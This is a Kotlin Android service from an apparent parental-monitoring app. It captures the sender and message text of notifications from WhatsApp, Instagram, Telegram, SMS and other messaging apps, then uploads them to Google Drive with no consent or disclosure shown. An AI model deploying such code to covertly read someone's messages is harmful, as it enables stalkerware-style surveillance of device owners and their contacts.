package com.guardianshield.app.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.guardianshield.app.utils.DriveApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class GuardianNotificationListener : NotificationListenerService() {

    private val monitoredPackages = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "org.telegram.messenger" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.facebook.orca" to "Messenger",
        "com.discord" to "Discord",
        "com.google.android.apps.messaging" to "SMS Messages",
        "com.samsung.android.messaging" to "Samsung SMS",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.google.android.youtube" to "YouTube"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val pkgName = sbn.packageName ?: ""
        val appName = monitoredPackages[pkgName] ?: return // Only capture messaging & social apps

        val extras = sbn.notification.extras ?: return
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""

        if (title.isBlank() && text.isBlank()) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(sbn.postTime))

        val notificationItem = mapOf(
            "id" to "${sbn.id}_${sbn.postTime}",
            "packageName" to pkgName,
            "appName" to appName,
            "sender" to title,
            "message" to if (subText.isNotEmpty()) "[$subText] $text" else text,
            "timestamp" to timestamp
        )

        // Upload directly to Google Drive
        CoroutineScope(Dispatchers.IO).launch {
            DriveApiClient.postToDrive("sync_social", listOf(notificationItem))
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional: track removed notifications
    }
}
